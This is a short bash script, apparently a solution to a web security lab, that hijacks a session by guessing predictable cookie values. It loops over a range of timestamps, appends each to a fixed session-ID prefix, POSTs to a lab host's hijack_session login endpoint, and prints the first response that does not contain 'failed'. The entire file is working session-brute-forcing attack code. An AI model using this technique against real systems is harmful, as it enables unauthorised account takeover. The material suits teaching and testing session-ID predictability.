#!/bin/bash
for ts in {17688288878..17688288886}; do
  result=$(curl -s -X POST -b "hijack_session=a29340bd-9bbf-49ce-b97-8122334-$ts" \
    http://web0x01.hbtn/api/a1/hijack_session/login)
  
  if [[ "$result" != *"failed"* ]]; then
    echo "TAPDIM: $result"
    break
  fi
done
